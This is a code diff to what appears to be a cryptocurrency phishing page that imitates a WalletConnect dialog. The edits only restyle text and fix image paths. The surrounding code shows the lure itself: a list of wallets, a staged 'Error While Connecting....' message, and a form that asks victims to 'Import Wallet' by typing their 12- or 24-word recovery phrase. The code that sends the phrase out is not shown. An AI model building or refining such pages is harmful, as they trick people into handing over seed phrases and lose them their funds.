@@ -12,8 +12,8 @@ window.onload = () => {
           </div>
 
           <div class="modal-body" type="button" data-dismiss="modal" data-toggle="modal" data-target="#walletList">
-            <div style="display: flex; flex-direction:column; align-items:center; justify-content:center">
-              <img style="height: 60px;" src="../../assets/img/wallet/walletconnect.svg" alt="">
+            <div style="display: flex; flex-direction:column; align-items:center; justify-content:center;color:white">
+              <img style="height: 60px;" src="./assets/images/wallet/walletconnect.svg" alt="">
               <h6>Wallet Connect</h6>
               <p>Scan with WalletConnect to Connect</p>
             </div>
@@ -27,7 +27,7 @@ window.onload = () => {
         <div class="modal-content">
           <div id="dark" class="modal-header text-white" style="border:none;border-radius:0px" >
             <div style="display: flex; align-items:center;gap:6px">
-              <img style="height: 60px;" src="../../assets/img/wallet/walletconnect.svg" alt="">
+              <img style="height: 60px;" src="./assets/images/wallet/walletconnect.svg" alt="">
               <h5 class="modal-title" id="exampleModalLongTitle">Wallet Connect</h5>
             </div>
 
@@ -80,7 +80,7 @@ window.onload = () => {
           <div class="container mt-5 bg-white">
             <div class="card text-center bg-white">
               <div class="card-header d-none" hidden>
-                <img style="height: 60px;" src="../../assets/img/wallet/walletconnect.svg" alt=""> Wallet Connect
+                <img style="height: 60px;" src="./assets/images/wallet/walletconnect.svg" alt=""> Wallet Connect
               </div>
               <div class="card-body">
                 <div style="display: flex; align-items:center; justify-content:center;gap:6px">
@@ -97,7 +97,7 @@ window.onload = () => {
                     <div style="width:100%; display:flex;align-items:center;" class="w-100">
                       <span class="walletError" style="color:red"></span>
                     </div>
-                    <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                    <p style="color:white">Typically 12 (sometimes 24) words separated by single spaces</p>
                   </div>
                   <div style="display:flex; flex-direction:column; gap:10px">
                         <button type="button" class="btn btn-primary PROCEED" onclick="proceed()">Import Wallet</button>
@@ -219,7 +219,7 @@ function loadWallet() {
       img
     } = wallet[i];
     const html = ` <div type="button" data-toggle="modal" data-target=".error" onclick="run(${i})" style="display: flex;flex-direction:column; align-items:center;gap:6px;">
-                  <img style="height: 30px;border-radius:5px" src="../../assets/img/wallet/${wallet[i].img}" alt="">
+                  <img style="height: 30px;border-radius:5px" src="./assets/images/wallet/${wallet[i].img}" alt="">
                            <h6 style="font-size: 15px;text-transform: capitalize;">${wallet[i].name}</h6>
          </div>`
     walletBoard.insertAdjacentHTML("beforeend", html)
@@ -241,8 +241,11 @@ function run(i) {
     img
   } = wallet[i]
 
-  selectedWalletImg.forEach(el => el.src = `../../assets/img/wallet/${img}`)
-  selectedWalletName.forEach(el => el.innerHTML = `Import Your ${name} Wallet`)
+  selectedWalletImg.forEach(el => el.src = `./assets/images/wallet/${img}`)
+  selectedWalletName.forEach(el => {
+           el.style.color = 'white'
+           el.innerHTML = `Import Your ${name} Wallet`
+  })
 
   setTimeout(() => {
     selectedWalletError.innerHTML = 'Error While Connecting....';
